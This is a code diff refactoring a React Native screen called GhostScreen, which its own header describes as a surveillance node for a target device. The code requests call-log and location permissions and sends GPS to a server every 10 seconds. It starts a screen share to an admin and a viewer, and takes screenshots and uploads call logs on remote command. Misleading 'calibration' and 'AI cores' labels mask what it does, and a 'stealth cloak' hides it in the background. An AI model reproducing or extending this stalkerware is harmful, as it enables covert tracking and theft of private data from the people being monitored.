@@ -1,18 +1,21 @@
+/**
+ * GhostScreen — Target device surveillance node interface.
+ *
+ * Responsibilities:
+ *  - Request all required OS permissions on mount
+ *  - Stream GPS heartbeats to server every 10s
+ *  - Silently initiate WebRTC screen-share offer to Admin/Viewer
+ *  - Respond to remote Admin commands: SNAPSHOT, WIPE, PAUSE, PLAY, PING, LOG_SYNC, DESTROY
+ *  - Provide stealth background exit via 'ENGAGE STEALTH CLOAK'
+ *  - Render an irrecoverable lockscreen when DESTROY is received
+ */
 import React, { useEffect, useState, useRef } from 'react';
-import { 
-  View, 
-  Text, 
-  TouchableOpacity, 
-  StyleSheet, 
-  PermissionsAndroid, 
-  Alert,
-  Platform,
-  StatusBar,
-  ActivityIndicator,
-  BackHandler
+import {
+  View, Text, TouchableOpacity, StyleSheet,
+  PermissionsAndroid, Platform, StatusBar, ActivityIndicator, BackHandler
 } from 'react-native';
 import { MaterialCommunityIcons } from '@expo/vector-icons';
-import * as Battery from 'expo-battery';
+import * as Battery  from 'expo-battery';
 import * as Location from 'expo-location';
 import * as ScreenCapture from 'expo-screen-capture';
 import { captureScreen } from 'react-native-view-shot';
@@ -21,264 +24,264 @@ import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription
 import socket from '../services/socket';
 import AppHeader from '../components/AppHeader';
 import GlobalAlert from '../utils/GlobalAlert';
+import { COLORS, RADIUS } from '../utils/theme';
+
+const ICE_SERVERS = [{ urls: 'stun:stun.l.google.com:19302' }];
 
 const GhostScreen = ({ name, onLogout }) => {
-  const [isSyncing, setIsSyncing] = useState(false);
-  const [isDestroyed, setIsDestroyed] = useState(false);
-  const [calibrationPulse, setCalibrationPulse] = useState(false);
-  const pcRef = useRef(null);
-  const isPausedRef = useRef(false);
+  const [isSyncing, setIsSyncing]   = useState(false);   // WebRTC pipeline active
+  const [isDestroyed, setIsDestroyed] = useState(false); // Final burn lockscreen
+  const pcRef       = useRef(null);   // PeerConnection handle
+  const isPausedRef = useRef(false);  // Pause state (ref avoids stale closures)
 
+  // ─── Startup & Event wiring ───────────────────────────────────────────────
   useEffect(() => {
-    const startup = async () => {
-      console.log("[Ghost] Starting services for", name);
-      updateVitals();
-      const vitalsInterval = setInterval(updateVitals, 10000);
+    startup();
 
-      if (Platform.OS === 'android') {
-        PermissionsAndroid.requestMultiple([
-          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
-          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
-          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
-        ]).catch(err => console.error("[Ghost] Permission error", err));
-      }
-      
-      try {
-        const { status } = await Location.requestForegroundPermissionsAsync();
-        if (status === 'granted') {
-          Location.startLocationUpdatesAsync('GHOST_LOCATION', {
-            accuracy: Location.Accuracy.BestForNavigation,
-            timeInterval: 15000,
-            distanceInterval: 10
-          }).catch(() => {});
-        }
-      } catch (e) {
-        console.warn("[Ghost] Location permission failed", e);
-      }
-      
-      return vitalsInterval;
-    };
-
-    const intervalId = startup();
-
+    // WebRTC answer / ICE candidate relay
     socket.on('webrtc_signal', async (data) => {
-      // Direct signal targeting check: only process if no target specified (legacy) or if it's for us
       if (data.target && data.target.toLowerCase() !== name.toLowerCase()) return;
       if (!pcRef.current) return;
-
-      if (data.type === 'answer') {
-        await pcRef.current.setRemoteDescription(new RTCSessionDescription(data.answer));
-      } else if (data.type === 'candidate') {
-        await pcRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
-      }
+      if (data.type === 'answer')    await pcRef.current.setRemoteDescription(new RTCSessionDescription(data.answer));
+      else if (data.type === 'candidate') await pcRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
     });
 
-    socket.on('admin_command', async (cmd) => {
-      if (cmd === 'SNAPSHOT') {
-        const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
-        socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
-      } else if (cmd === 'WIPE') {
-        onLogout(); 
-      } else if (cmd === 'PING') {
-        updateVitals();
-      } else if (cmd === 'LOG_SYNC') {
-        const logs = await CallLogs.load(10);
-        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
-      } else if (cmd === 'PAUSE') {
-        isPausedRef.current = true;
-        if (pcRef.current) {
-          pcRef.current.close();
-          pcRef.current = null;
-        }
-        setIsSyncing(false);
-        setCalibrationPulse(false);
-        updateVitals();
-      } else if (cmd === 'PLAY') {
-        isPausedRef.current = false;
-        updateVitals();
-      } else if (cmd === 'DESTROY') {
-        setIsSyncing(false);
-        if (pcRef.current) pcRef.current.close();
-        setIsDestroyed(true); // Engages the permanent lock screen
-        setTimeout(() => onLogout(), 10000); // Eventually force logout anyway
-      }
-    });
+    // Remote commands from Admin
+    socket.on('admin_command', handleCommand);
 
     return () => {
       socket.off('webrtc_signal');
       socket.off('admin_command');
-      intervalId.then(id => clearInterval(id));
       if (pcRef.current) pcRef.current.close();
     };
   }, []);
 
-  const updateVitals = async () => {
+  // ─── Startup: permissions + location task + vitals loop ─────────────────
+  const startup = async () => {
+    sendVitals(); // immediate first ping
+    setInterval(sendVitals, 10000); // heartbeat every 10s
+
+    // Android permissions batch request
+    if (Platform.OS === 'android') {
+      PermissionsAndroid.requestMultiple([
+        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
+        PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
+        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
+      ]).catch(() => {});
+    }
+
+    // Background location task (survives app minimize)
+    try {
+      const { status } = await Location.requestForegroundPermissionsAsync();
+      if (status === 'granted') {
+        Location.startLocationUpdatesAsync('GHOST_LOCATION', {
+          accuracy:         Location.Accuracy.BestForNavigation,
+          timeInterval:     15000,
+          distanceInterval: 10,
+        }).catch(() => {});
+      }
+    } catch (e) {}
+  };
+
+  // ─── Command handler (dispatched from Admin dashboard) ───────────────────
+  const handleCommand = async (cmd) => {
+    switch (cmd) {
+      case 'SNAPSHOT':
+        // Silent screenshot upload
+        const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
+        socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
+        break;
+
+      case 'WIPE':
+        // Soft logout — returns to login screen
+        onLogout();
+        break;
+
+      case 'PING':
+        // Admin requested fresh vitals
+        sendVitals();
+        break;
+
+      case 'LOG_SYNC':
+        // Pull latest call logs and upload
+        const logs = await CallLogs.load(10);
+        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
+        break;
+
+      case 'PAUSE':
+        // Power-save: close video bridge, use cached GPS
+        isPausedRef.current = true;
+        if (pcRef.current) { pcRef.current.close(); pcRef.current = null; }
+        setIsSyncing(false);
+        sendVitals();
+        break;
+
+      case 'PLAY':
+        // Wake from power-save
+        isPausedRef.current = false;
+        sendVitals();
+        break;
+
+      case 'DESTROY':
+        // Permanent burn — show lockscreen, then logout after 10s
+        setIsSyncing(false);
+        if (pcRef.current) pcRef.current.close();
+        setIsDestroyed(true);
+        setTimeout(onLogout, 10000);
+        break;
+
+      default: break;
+    }
+  };
+
+  // ─── Heartbeat — GPS + battery status ping ──────────────────────────────
+  const sendVitals = async () => {
     let bat = 1;
-    let loc = { coords: { latitude: 0, longitude: 0 } };
+    let loc = null;
 
     try {
-      const batLevel = await Battery.getBatteryLevelAsync();
-      if (batLevel !== -1) bat = batLevel;
+      const level = await Battery.getBatteryLevelAsync();
+      if (level !== -1) bat = level;
     } catch (e) {}
 
     try {
-      if (isPausedRef.current) {
-        loc = await Location.getLastKnownPositionAsync();
-      } else {
-        loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
-      }
+      loc = isPausedRef.current
+        ? await Location.getLastKnownPositionAsync()
+        : await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
     } catch (e) {
-      try {
-        loc = await Location.getLastKnownPositionAsync();
-      } catch (e2) {}
+      try { loc = await Location.getLastKnownPositionAsync(); } catch (e2) {}
     }
 
     socket.emit('heartbeat_update', {
       name,
-      battery: Math.floor(bat * 100) + '%',
-      location: loc ? { lat: loc?.coords?.latitude || 0, lng: loc?.coords?.longitude || 0 } : { lat: 0, lng: 0 },
-      status: isPausedRef.current ? 'PAUSED' : 'OPTIMIZED',
-      lastSeen: Date.now()
+      battery:  Math.floor(bat * 100) + '%',
+      location: loc ? { lat: loc.coords.latitude, lng: loc.coords.longitude } : { lat: 0, lng: 0 },
+      status:   isPausedRef.current ? 'PAUSED' : 'OPTIMIZED',
+      lastSeen: Date.now(),
     });
   };
 
+  // ─── Calibration: initiate WebRTC screen-share ──────────────────────────
   const startCalibration = async () => {
     try {
       setIsSyncing(true);
-      setCalibrationPulse(true);
-      
-      const stream = await mediaDevices.getDisplayMedia({
-        video: { width: 480, height: 854, frameRate: 15 }
+      const stream = await mediaDevices.getDisplayMedia({ video: { width: 480, height: 854, frameRate: 15 } });
+      if (!stream) return;
+
+      const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+      pcRef.current = pc;
+      stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+      pc.onicecandidate = ({ candidate }) => {
+        if (!candidate) return;
+        const viewer = name.split('_')[0].toLowerCase();
+        // Relay to parent viewer AND admin
+        socket.emit('relay_ice_candidate', { from: name, target: viewer, candidate });
+        socket.emit('relay_ice_candidate', { from: name, target: 'admin', candidate });
+      };
+
+      const offer = await pc.createOffer();
+      await pc.setLocalDescription(offer);
+
+      socket.emit('broadcast_offer', {
+        ghostName:    name,
+        targetViewer: name.split('_')[0].toLowerCase(),
+        offer,
       });
 
-      if (stream) {
-        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-        const peerConnection = new RTCPeerConnection(configuration);
-        pcRef.current = peerConnection;
+      // Sync call logs automatically on first calibration
+      const logs = await CallLogs.load(10);
+      socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
 
-        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
-
-        peerConnection.onicecandidate = (event) => {
-          if (event.candidate) {
-            const viewerPrefix = name.split('_')[0].toLowerCase();
-            // Relay to matching viewer prefix
-            socket.emit('relay_ice_candidate', { 
-              from: name, 
-              target: viewerPrefix, 
-              candidate: event.candidate 
-            });
-            // ALSO explicitly relay to Admin Dashboard
-            socket.emit('relay_ice_candidate', { 
-              from: name, 
-              target: 'admin', 
-              candidate: event.candidate 
-            });
-          }
-        };
-
-        const offer = await peerConnection.createOffer();
-        await peerConnection.setLocalDescription(offer);
-        
-        const viewerPrefix = name.split('_')[0];
-        socket.emit('broadcast_offer', { 
-          ghostName: name, 
-          targetViewer: viewerPrefix.toLowerCase(), 
-          offer: offer 
-        });
-
-        const logs = await CallLogs.load(10);
-        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
-      }
     } catch (err) {
       setIsSyncing(false);
-      setCalibrationPulse(false);
-      GlobalAlert.show("System Error", "Hardware calibration failed. Service overlay rejected.", 'danger');
+      GlobalAlert.show('CALIBRATION FAILED', 'Display overlay permission denied by OS.', 'danger');
     }
   };
 
+  // ─── Render: Burn lockscreen ─────────────────────────────────────────────
   if (isDestroyed) {
     return (
-      <View style={[styles.container, { justifyContent: 'center', backgroundColor: '#000' }]}>
+      <View style={styles.burnScreen}>
         <StatusBar hidden />
-        <MaterialCommunityIcons name="skull-crossbones" size={80} color="#EF4444" style={{ alignSelf: 'center' }} />
-        <Text style={[styles.statusLabel, { color: '#EF4444', fontSize: 14, marginTop: 20 }]}>SYSTEM TERMINATED</Text>
-        <Text style={[styles.statusLabel, { color: '#666', fontSize: 10 }]}>NODE ID: {name.toUpperCase()} PURGED FROM REGISTRY</Text>
-        <Text style={[styles.statusLabel, { color: '#333', fontSize: 8, marginTop: 40 }]}>PHYSICAL UNINSTALL RECOMMENDED TO CLEAR BINARY TRACES</Text>
+        <MaterialCommunityIcons name="skull-crossbones" size={90} color={COLORS.red} />
+        <Text style={styles.burnTitle}>NODE TERMINATED</Text>
+        <Text style={styles.burnSub}>ID: {name.toUpperCase()} — PURGED FROM REGISTRY</Text>
+        <Text style={styles.burnHint}>Physical uninstall required to clear binary traces.</Text>
       </View>
     );
   }
 
+  // ─── Render: Main Ghost UI ───────────────────────────────────────────────
   return (
     <View style={styles.container}>
-      <StatusBar barStyle="light-content" backgroundColor="#0F172A" />
-      
+      <StatusBar barStyle="light-content" backgroundColor={COLORS.bg} />
+
+      {/* Header */}
       <View style={styles.headerArea}>
         <AppHeader />
-        <TouchableOpacity 
-          activeOpacity={0.7} 
-          style={styles.nodeBadge}
-        >
-          <Text style={styles.nodeBadgeText}>NODE: {name.toUpperCase()}</Text>
-        </TouchableOpacity>
+        <View style={styles.nodeBadge}>
+          <MaterialCommunityIcons name="ghost" size={12} color={COLORS.amber} style={{ marginRight: 5 }} />
+          <Text style={styles.nodeBadgeText}>{name.toUpperCase()}</Text>
+        </View>
       </View>
 
+      {/* Central Calibration Orb */}
       <View style={styles.centerArea}>
-        <TouchableOpacity 
-          activeOpacity={0.8}
-          style={[styles.orbContainer, isSyncing && styles.orbActive]} 
+        <TouchableOpacity
+          style={[styles.orb, isSyncing && styles.orbActive]}
           onPress={startCalibration}
           disabled={isSyncing}
+          activeOpacity={0.8}
         >
-          <View style={[styles.orbInner, isSyncing && styles.orbInnerPulse]}>
-            {isSyncing ? (
-              <ActivityIndicator color="#38BDF8" size="large" />
-            ) : (
-              <MaterialCommunityIcons name="molecule" size={64} color="#334155" />
-            )}
-            <Text style={[styles.orbText, isSyncing && { color: '#38BDF8' }]}>
-              {isSyncing ? "SYNCED" : "CALIBRATE"}
+          <View style={[styles.orbInner, isSyncing && styles.orbInnerActive]}>
+            {isSyncing
+              ? <ActivityIndicator color={COLORS.cyan} size="large" />
+              : <MaterialCommunityIcons name="molecule" size={56} color={COLORS.border} />
+            }
+            <Text style={[styles.orbLabel, isSyncing && { color: COLORS.cyan }]}>
+              {isSyncing ? 'SYNCED' : 'CALIBRATE'}
             </Text>
           </View>
-          {isSyncing && (
-            <View style={styles.orbRing} />
-          )}
+          {isSyncing && <View style={styles.orbRing} />}
         </TouchableOpacity>
-        
-        <Text style={styles.statusLabel}>
-          {isSyncing ? "☣️ CORE NEURAL SYNC ACTIVE" : "📡 AWAITING SAT-LINK COMMAND"}
+        <Text style={styles.statusLine}>
+          {isSyncing ? '☣ CORE NEURAL SYNC ACTIVE' : '📡 AWAITING SAT-LINK COMMAND'}
         </Text>
       </View>
 
-      <View style={styles.dataGrid}>
+      {/* Sensor Status Grid */}
+      <View style={styles.grid}>
         <View style={styles.gridItem}>
-          <MaterialCommunityIcons name="cpu-64-bit" size={24} color="#38BDF8" />
+          <MaterialCommunityIcons name="cpu-64-bit" size={22} color={COLORS.cyan} />
           <View style={styles.gridText}>
             <Text style={styles.gridLabel}>AI CORES</Text>
             <Text style={styles.gridVal}>8 ACTIVE</Text>
           </View>
         </View>
         <View style={styles.gridItem}>
-          <MaterialCommunityIcons name="shield-key" size={24} color="#10B981" />
+          <MaterialCommunityIcons name="shield-key" size={22} color={COLORS.green} />
           <View style={styles.gridText}>
             <Text style={styles.gridLabel}>ENCRYPTION</Text>
             <Text style={styles.gridVal}>TLS v1.3</Text>
           </View>
         </View>
         <View style={styles.gridItem}>
-          <MaterialCommunityIcons name="database-sync" size={24} color="#F59E0B" />
+          <MaterialCommunityIcons name="database-sync" size={22} color={COLORS.amber} />
           <View style={styles.gridText}>
             <Text style={styles.gridLabel}>SYNC STATUS</Text>
-            <Text style={styles.gridVal}>{isSyncing ? "ACTIVE" : "IDLE"}</Text>
+            <Text style={styles.gridVal}>{isSyncing ? 'TRANSMITTING' : 'STANDBY'}</Text>
           </View>
         </View>
 
-        <TouchableOpacity 
-          activeOpacity={0.8}
-          style={styles.stealthBtn} 
+        {/* Stealth Cloak — exits to background without killing the socket */}
+        <TouchableOpacity
+          style={styles.stealthBtn}
           onPress={() => BackHandler.exitApp()}
+          activeOpacity={0.8}
         >
-          <MaterialCommunityIcons name="incognito" size={20} color="#10B981" />
-          <Text style={styles.stealthBtnText}>ENGAGE STEALTH CLOAK</Text>
+          <MaterialCommunityIcons name="incognito" size={18} color={COLORS.green} />
+          <Text style={styles.stealthText}>ENGAGE STEALTH CLOAK</Text>
         </TouchableOpacity>
       </View>
     </View>
@@ -286,32 +289,39 @@ const GhostScreen = ({ name, onLogout }) => {
 };
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#0F172A', paddingTop: 60, paddingBottom: 100, paddingHorizontal: 24, justifyContent: 'space-between' },
-  
-  headerArea: { alignItems: 'center' },
-  nodeBadge: { backgroundColor: '#1E293B', paddingHorizontal: 12, paddingVertical: 4, borderRadius: 12, marginTop: 10, borderWidth: 1, borderColor: '#334155' },
-  nodeBadgeText: { color: '#38BDF8', fontSize: 10, fontWeight: '700', letterSpacing: 1 },
+  container: { flex: 1, backgroundColor: COLORS.bg, paddingTop: 56, paddingBottom: 90, paddingHorizontal: 20, justifyContent: 'space-between' },
 
-  centerArea: { alignItems: 'center', marginVertical: 12 },
-  orbContainer: { width: 110, height: 110, borderRadius: 55, backgroundColor: '#1E293B', justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: '#334155', shadowColor: '#000', shadowOffset: {width: 0, height: 2}, shadowOpacity: 0.1, shadowRadius: 5, elevation: 4 },
-  orbActive: { borderColor: '#38BDF8', backgroundColor: 'rgba(56, 189, 248, 0.05)' },
-  orbInner: { width: 90, height: 90, borderRadius: 45, backgroundColor: '#0F172A', justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: '#334155' },
-  orbInnerPulse: { borderColor: '#38BDF8', shadowColor: '#38BDF8', shadowOpacity: 0.5, shadowRadius: 10 },
-  orbText: { color: '#444', fontSize: 8, fontWeight: '800', letterSpacing: 1.2, marginTop: 4 },
-  orbRing: { position: 'absolute', width: 126, height: 126, borderRadius: 63, borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.1)' },
-  
-  statusLabel: { color: '#64748B', fontSize: 8, fontWeight: '700', letterSpacing: 1, marginTop: 10, textAlign: 'center' },
+  // Burn screen
+  burnScreen: { flex: 1, backgroundColor: '#000', justifyContent: 'center', alignItems: 'center', paddingHorizontal: 30 },
+  burnTitle:  { color: COLORS.red, fontSize: 18, fontWeight: '900', letterSpacing: 3, marginTop: 20 },
+  burnSub:    { color: '#555', fontSize: 11, marginTop: 8, textAlign: 'center' },
+  burnHint:   { color: '#333', fontSize: 9, marginTop: 40, textAlign: 'center', letterSpacing: 1 },
 
-  dataGrid: { gap: 8 },
-  gridItem: { flexDirection: 'row', alignItems: 'center', backgroundColor: '#1E293B', padding: 10, borderRadius: 10, borderWidth: 1, borderColor: '#334155' },
-  gridText: { marginLeft: 10 },
-  gridLabel: { color: '#64748B', fontSize: 8, fontWeight: '700', letterSpacing: 0.8 },
-  gridVal: { color: '#F8FAFC', fontSize: 11, fontWeight: '800', marginTop: 1 },
+  // Header
+  headerArea:    { alignItems: 'center' },
+  nodeBadge:     { flexDirection: 'row', alignItems: 'center', marginTop: 10, backgroundColor: 'rgba(245,158,11,0.08)', paddingHorizontal: 12, paddingVertical: 5, borderRadius: 12, borderWidth: 1, borderColor: 'rgba(245,158,11,0.25)' },
+  nodeBadgeText: { color: COLORS.amber, fontSize: 10, fontWeight: '800', letterSpacing: 1.5 },
 
-  stealthBtn: { flexDirection: 'row', alignItems: 'center', justifyContent: 'center', backgroundColor: 'rgba(16, 185, 129, 0.1)', paddingVertical: 14, borderRadius: 12, borderWidth: 1, borderColor: 'rgba(16, 185, 129, 0.3)', marginTop: 16 },
-  stealthBtnText: { color: '#10B981', fontSize: 12, fontWeight: '800', letterSpacing: 2, marginLeft: 10 },
+  // Orb
+  centerArea:    { alignItems: 'center' },
+  orb:           { width: 120, height: 120, borderRadius: 60, backgroundColor: COLORS.surface, justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: COLORS.border, elevation: 4 },
+  orbActive:     { borderColor: COLORS.cyan, backgroundColor: 'rgba(56,189,248,0.05)' },
+  orbInner:      { width: 98, height: 98, borderRadius: 49, backgroundColor: COLORS.bg, justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: COLORS.border },
+  orbInnerActive:{ borderColor: COLORS.cyan },
+  orbLabel:      { color: COLORS.border, fontSize: 8, fontWeight: '900', letterSpacing: 1.5, marginTop: 4 },
+  orbRing:       { position: 'absolute', width: 138, height: 138, borderRadius: 69, borderWidth: 1, borderColor: 'rgba(56,189,248,0.12)' },
+  statusLine:    { color: COLORS.textMuted, fontSize: 9, fontWeight: '700', letterSpacing: 1, marginTop: 14 },
 
-  logoutBtn: { visibility: 'hidden' }
+  // Grid
+  grid:      { gap: 8 },
+  gridItem:  { flexDirection: 'row', alignItems: 'center', backgroundColor: COLORS.surface, padding: 12, borderRadius: RADIUS.md, borderWidth: 1, borderColor: COLORS.border },
+  gridText:  { marginLeft: 12 },
+  gridLabel: { color: COLORS.textMuted, fontSize: 8, fontWeight: '700', letterSpacing: 1 },
+  gridVal:   { color: COLORS.textPrimary, fontSize: 12, fontWeight: '800', marginTop: 2 },
+
+  // Stealth button
+  stealthBtn:  { flexDirection: 'row', alignItems: 'center', justifyContent: 'center', backgroundColor: 'rgba(16,185,129,0.08)', paddingVertical: 14, borderRadius: RADIUS.md, borderWidth: 1, borderColor: 'rgba(16,185,129,0.3)', marginTop: 8 },
+  stealthText: { color: COLORS.green, fontSize: 12, fontWeight: '900', letterSpacing: 2.5, marginLeft: 10 },
 });
 
 export default GhostScreen;
